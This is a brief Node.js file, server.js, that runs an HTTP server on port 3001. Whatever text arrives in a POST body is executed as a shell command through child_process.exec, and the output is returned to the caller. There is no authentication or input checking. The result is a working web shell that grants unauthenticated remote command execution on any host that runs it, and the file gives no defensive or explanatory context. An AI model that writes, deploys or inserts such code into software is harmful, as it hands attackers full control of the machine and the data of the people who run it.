// server.js
const http = require('http');
const { exec } = require('child_process');

const server = http.createServer((req, res) => {
  if (req.method === 'POST') {
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
    });
    req.on('end', () => {
      exec(body, (err, stdout, stderr) => {
        if (err) {
          res.writeHead(500, { 'Content-Type': 'text/plain' });
          res.end(stderr);
        } else {
          res.writeHead(200, { 'Content-Type': 'text/plain' });
          res.end(stdout);
        }
      });
    });
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
  }
});

server.listen(3001, () => {
  console.log('Server listening on port 3001');
});
